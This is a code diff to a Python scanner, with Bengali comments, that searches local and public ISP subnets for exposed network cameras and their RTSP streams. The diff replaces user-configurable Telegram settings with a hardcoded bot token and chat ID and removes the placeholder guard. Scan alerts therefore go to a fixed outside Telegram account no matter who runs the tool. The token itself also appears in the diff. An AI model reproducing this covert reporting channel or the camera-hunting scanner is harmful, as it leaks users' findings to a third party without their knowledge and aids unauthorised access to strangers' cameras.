@@ -12,10 +12,9 @@ import uuid
 
 DB_FILE = "arman_live_cameras.txt"
 
-# === TELEGRAM CONFIGURATION ===
-# এখানে তোর টেলিগ্রাম বট টোকেন এবং চ্যাট আইডি বসিয়ে দিবি
-TELEGRAM_BOT_TOKEN = "YOUR_TELEGRAM_BOT_TOKEN"
-TELEGRAM_CHAT_ID = "YOUR_TELEGRAM_CHAT_ID"
+# === TELEGRAM CONFIGURATION (Pre-configured) ===
+TELEGRAM_BOT_TOKEN = "8586320916:AAG5r8YcxtJo0Q5aGUX-vOjTsCVMzvh9zsk"
+TELEGRAM_CHAT_ID = "5940676703"
 
 PORT_MAPPING = {
     80: ("Generic Web Cam / Router", "HTTP"),
@@ -91,7 +90,6 @@ def verify_client_license():
   except SystemExit:
     sys.exit()
   except Exception as e:
-    # যদি সার্ভার ডাউন থাকে বা ইন্টারনেট না থাকে, তবুও নিজের ডিভাইসের ক্ষেত্রে বাইপাস বা চেক রাখতে পারিস
     if user_hwid == "ARMAN-79CA2A09":
       return
     print(f"\n\033[93m[!] লাইসেন্স সার্ভার চেক করা যায়নি: {e}\033[0m")
@@ -111,15 +109,13 @@ def banner():
   print("=" * 65 + "\033[0m")
 
 def send_telegram_alert(message):
-  if TELEGRAM_BOT_TOKEN == "YOUR_TELEGRAM_BOT_TOKEN" or TELEGRAM_CHAT_ID == "YOUR_TELEGRAM_CHAT_ID":
-    return
   try:
     url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
     data = urllib.parse.urlencode({"chat_id": TELEGRAM_CHAT_ID, "text": message}).encode("utf-8")
     req = urllib.request.Request(url, data=data, method="POST")
     urllib.request.urlopen(req, timeout=2)
-  except:
-    pass
+  except Exception as e:
+    print(f"\n[!] Telegram Error: {e}")
 
 def save_to_db(ip, port, brand, proto, rtsp_link):
   timestamp = datetime.now().strftime("%Y-%m-%d %H:%M")
@@ -196,7 +192,7 @@ def view_database():
 
 def main():
   verify_client_license()
-  while True:
+  while Time := True:
     banner()
     print("1. Scan Local Wi-Fi (LAN) + Silent Port Mapping")
     print("2. Scan Custom Public / ISP Subnet Range")
